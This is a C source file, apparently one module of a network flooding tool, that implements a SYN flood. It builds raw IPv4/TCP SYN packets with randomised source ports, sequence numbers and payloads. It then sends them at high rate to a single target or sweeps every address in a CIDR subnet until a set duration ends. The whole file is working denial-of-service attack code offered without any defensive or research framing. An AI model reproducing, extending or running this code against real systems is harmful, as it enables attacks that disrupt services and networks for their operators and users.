#define _GNU_SOURCE
#include "headers/attack_params.h"
#include <stddef.h>
#include <stdint.h>

void* syn_attack(void* arg) {
    attack_params* params = (attack_params*)arg;
    if (!params) return NULL;

    int syn_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (syn_sock < 0) return NULL;

    int one = 1;
    setsockopt(syn_sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));

    /* 8MB send buffer */
    int sndbuf = 8 * 1024 * 1024;
    setsockopt(syn_sock, SOL_SOCKET, SO_SNDBUF, &sndbuf, sizeof(sndbuf));

    const size_t ip_size  = sizeof(struct iphdr);
    const size_t tcp_size = sizeof(struct tcphdr);

    int psize_min = params->len_min > 0 ? (int)params->len_min
                  : (params->len > 0 ? (int)params->len : 40);
    int psize_max = params->len_max > 0 ? (int)params->len_max : psize_min;
    if ((size_t)psize_min < ip_size + tcp_size) psize_min = (int)(ip_size + tcp_size);
    if ((size_t)psize_max < ip_size + tcp_size) psize_max = (int)(ip_size + tcp_size);
    if (psize_max > 1500) psize_max = 1500;
    if (psize_max < psize_min) psize_max = psize_min;

    unsigned char packet[1500];
    struct iphdr*  iph  = (struct iphdr*)packet;
    struct tcphdr* tcph = (struct tcphdr*)(packet + ip_size);

    /* Pre-fill payload with random bytes once */
    unsigned char *payload = packet + ip_size + tcp_size;
    size_t max_payload = sizeof(packet) - ip_size - tcp_size;
    for (size_t i = 0; i < max_payload; i++)
        payload[i] = (unsigned char)(rand() & 0xFF);

    struct sockaddr_in dest;
    memset(&dest, 0, sizeof(dest));
    dest.sin_family      = AF_INET;
    dest.sin_port        = params->target_addr.sin_port;
    dest.sin_addr        = params->target_addr.sin_addr;

    iph->ihl      = 5;
    iph->version  = 4;
    iph->tos      = 0;
    iph->frag_off = 0;
    iph->ttl      = 64;
    iph->protocol = IPPROTO_TCP;
    iph->saddr    = INADDR_ANY;
    iph->daddr    = params->target_addr.sin_addr.s_addr;

    tcph->dest    = params->target_addr.sin_port;
    tcph->ack_seq = 0;
    tcph->doff    = 5;
    tcph->syn     = 1;
    tcph->ack     = 0;
    tcph->psh     = 1;
    tcph->rst     = 0;
    tcph->fin     = 0;
    tcph->urg     = 0;
    tcph->window  = htons(65535);
    tcph->urg_ptr = 0;

    int usleep_min = params->usleep_min > 0 ? params->usleep_min : 0;
    int usleep_max = params->usleep_max > 0 ? params->usleep_max : 0;
    int use_usleep  = usleep_min > 0;

    time_t end_time = time(NULL) + params->duration;
    uint64_t pkt = 0;

    if (params->cidr > 0) {
        uint32_t base  = ntohl(params->base_ip);
        uint32_t mask  = params->cidr == 32 ? 0xFFFFFFFF : (~0U << (32 - params->cidr));
        uint32_t start = base & mask;
        uint32_t end   = start | (~mask);
        struct sockaddr_in dest_sub = dest;

        while (params->active) {
            if ((pkt & 8191) == 0 && time(NULL) >= end_time) break;

            size_t packet_size = (psize_min == psize_max) ? (size_t)psize_min
                               : (size_t)(psize_min + (rand() % (psize_max - psize_min + 1)));
            iph->tot_len = htons((uint16_t)packet_size);

            if (params->cidr == 32) {
                dest_sub.sin_addr.s_addr = htonl(start);
                iph->daddr   = dest_sub.sin_addr.s_addr;
                iph->id      = htons((uint16_t)(rand() & 0xFFFF));
                tcph->source = htons(params->srcport > 0 ? (uint16_t)params->srcport : (uint16_t)(rand() & 0xFFFF));
                tcph->seq    = htonl((uint32_t)rand());
                iph->check   = 0;
                tcph->check  = 0;
                iph->check   = generic_checksum((unsigned short*)iph, ip_size);
                tcph->check  = tcp_udp_checksum(tcph, packet_size - ip_size, iph->saddr, iph->daddr, IPPROTO_TCP);
                sendto(syn_sock, packet, packet_size, MSG_NOSIGNAL | MSG_DONTWAIT,
                       (struct sockaddr*)&dest_sub, sizeof(dest_sub));
                pkt++;
            } else if (params->cidr == 31) {
                /* send to both IPs in the /31 */
                for (int pass = 0; pass < 2; pass++) {
                    dest_sub.sin_addr.s_addr = htonl(pass == 0 ? start : end);
                    iph->daddr   = dest_sub.sin_addr.s_addr;
                    iph->id      = htons((uint16_t)(rand() & 0xFFFF));
                    tcph->source = htons(params->srcport > 0 ? (uint16_t)params->srcport : (uint16_t)(rand() & 0xFFFF));
                    tcph->seq    = htonl((uint32_t)rand());
                    iph->check   = 0; tcph->check = 0;
                    iph->check   = generic_checksum((unsigned short*)iph, ip_size);
                    tcph->check  = tcp_udp_checksum(tcph, packet_size - ip_size, iph->saddr, iph->daddr, IPPROTO_TCP);
                    sendto(syn_sock, packet, packet_size, MSG_NOSIGNAL | MSG_DONTWAIT,
                           (struct sockaddr*)&dest_sub, sizeof(dest_sub));
                    pkt++;
                }
            } else {
                for (uint32_t ip = start + 1; ip < end; ++ip) {
                    dest_sub.sin_addr.s_addr = htonl(ip);
                    iph->daddr   = dest_sub.sin_addr.s_addr;
                    iph->id      = htons((uint16_t)(rand() & 0xFFFF));
                    tcph->source = htons(params->srcport > 0 ? (uint16_t)params->srcport : (uint16_t)(rand() & 0xFFFF));
                    tcph->seq    = htonl((uint32_t)rand());
                    iph->check   = 0; tcph->check = 0;
                    iph->check   = generic_checksum((unsigned short*)iph, ip_size);
                    tcph->check  = tcp_udp_checksum(tcph, packet_size - ip_size, iph->saddr, iph->daddr, IPPROTO_TCP);
                    sendto(syn_sock, packet, packet_size, MSG_NOSIGNAL | MSG_DONTWAIT,
                           (struct sockaddr*)&dest_sub, sizeof(dest_sub));
                    pkt++;
                }
                continue; /* skip per-packet usleep in subnet sweep */
            }

            if (use_usleep) {
                int delay = usleep_min;
                if (usleep_max > usleep_min) delay += rand() % (usleep_max - usleep_min + 1);
                usleep(delay);
            }
        }
    } else {
        while (params->active) {
            if ((pkt & 8191) == 0 && time(NULL) >= end_time) break;

            size_t packet_size = (psize_min == psize_max) ? (size_t)psize_min
                               : (size_t)(psize_min + (rand() % (psize_max - psize_min + 1)));
            iph->tot_len = htons((uint16_t)packet_size);
            iph->id      = htons((uint16_t)(rand() & 0xFFFF));
            tcph->source = htons(params->srcport > 0 ? (uint16_t)params->srcport : (uint16_t)(rand() & 0xFFFF));
            tcph->seq    = htonl((uint32_t)rand());
            iph->check   = 0;
            tcph->check  = 0;
            iph->check   = generic_checksum((unsigned short*)iph, ip_size);
            tcph->check  = tcp_udp_checksum(tcph, packet_size - ip_size, iph->saddr, iph->daddr, IPPROTO_TCP);
            sendto(syn_sock, packet, packet_size, MSG_NOSIGNAL | MSG_DONTWAIT,
                   (struct sockaddr*)&dest, sizeof(dest));
            pkt++;

            if (use_usleep) {
                int delay = usleep_min;
                if (usleep_max > usleep_min) delay += rand() % (usleep_max - usleep_min + 1);
                usleep(delay);
            }
        }
    }

    close(syn_sock);
    return NULL;
}
